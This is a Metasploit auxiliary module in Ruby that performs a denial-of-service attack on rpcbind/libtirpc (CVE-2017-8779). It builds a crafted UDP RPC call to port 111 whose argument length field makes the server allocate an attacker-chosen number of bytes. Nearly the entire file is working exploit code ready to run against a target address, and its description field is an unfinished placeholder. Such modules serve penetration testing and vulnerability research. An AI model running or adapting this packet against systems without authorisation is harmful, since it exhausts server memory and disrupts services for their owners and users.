##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Dos
  # include Exploit::Remote::Udp

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'RPC DoS targeting *nix rpcbind/libtirpc',
      'Description' => %q{
        This module XXX.
      },
      'Author'  =>
        [
          'guidovranken', # original code
          'Pearce Barry <pearce_barry[at]rapid7.com>' # Metasploit module
        ],
      'License' => MSF_LICENSE,
      'References' => [
        [ 'CVE', '2017-8779' ],
        [ 'BID', '98325' ],
        [ 'URL', 'http://openwall.com/lists/oss-security/2017/05/03/12' ]
      ],
      'Disclosure Date' => 'May 03 2017'))

    register_options([
      Opt::RPORT(111),
      OptAddress.new('RHOST', [true, 'RPC server target']),
      OptInt.new('ALLOCSIZE', [true, 'Number of bytes to allocate'])
    ])
  end



  def run
    require 'socket'

    pkt = [0].pack('N')         # xid
    pkt << [0].pack('N')        # message type CALL
    pkt << [2].pack('N')        # RPC version 2
    pkt << [100000].pack('N')   # Program
    pkt << [4].pack('N')        # Program version
    pkt << [9].pack('N')        # Procedure
    pkt << [0].pack('N')        # Credentials AUTH_NULL
    pkt << [0].pack('N')        # Credentials length 0
    pkt << [0].pack('N')        # Credentials AUTH_NULL
    pkt << [0].pack('N')        # Credentials length 0
    pkt << [0].pack('N')        # Program: 0
    pkt << [0].pack('N')        # Ver
    pkt << [4].pack('N')        # Proc
    pkt << [4].pack('N')        # Argument length
    pkt << [datastore['ALLOCSIZE']].pack('N') # Payload

    s = UDPSocket.new
    s.send(pkt, 0, datastore['RHOST'], datastore['RPORT'])

    sleep 1.5

    begin
        s.recvfrom_nonblock(9000)
    rescue
        print_error("No response from server received.")
        return
    end

    print_good("Allocated #{datastore['ALLOCSIZE']} bytes at host #{datastore['RHOST']}:#{datastore['RPORT']}")
  end
end
